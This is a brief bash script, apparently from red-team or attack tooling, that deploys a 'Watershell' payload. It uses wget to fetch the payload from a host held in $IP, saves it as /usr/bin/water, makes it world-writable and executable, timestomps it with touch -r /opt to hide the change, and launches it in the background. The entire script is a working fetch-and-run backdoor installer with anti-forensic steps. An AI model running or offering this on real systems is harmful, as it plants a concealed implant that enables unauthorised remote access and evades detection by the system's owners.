#!/bin/bash

#Download Watershell payload
wget $IP/payloads/watershell -O /usr/bin/water

#Change permissions
chmod 777 /usr/bin/water

touch -r /opt /usr/bin/water

#Execute
/usr/bin/water &

